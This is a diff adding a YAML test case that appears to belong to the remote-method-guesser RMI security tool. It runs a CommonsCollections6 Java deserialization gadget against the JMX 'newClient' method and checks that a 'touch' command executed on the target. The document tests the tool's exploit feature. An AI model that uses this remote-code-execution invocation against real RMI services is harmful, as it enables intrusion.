@@ -1,0 +1,37 @@
+tester:
+  name: method
+  title: Method Tests
+  description: >
+    "Performs tests on remote-methods-guessers 'method' action."
+
+variables:
+  file: method-rce-test.txt
+
+tests:
+  - title: Gadget Call
+    description: >
+      'Performs a deserialization attack on the newClient function of the'
+      'RMIServerImpl object.'
+
+    command: '${BASE-CMD}'
+    arguments:
+      - method
+      - CommonsCollections6 
+      - 'touch ${volume-d}/${file}'
+      - --signature
+      - 'javax.management.remote.rmi.RMIConnection newClient(java.lang.Object arg)'
+      - --bound-name
+      - jmxrmi
+
+    validators:
+      - error: False
+      - contains:
+          values:
+            - java.lang.Object
+            - Caught ClassNotFoundException
+            - deserialize dummy
+            - probably worked
+      - file_exists:
+          cleanup: True
+          files:
+            - '${volume}/${file}'
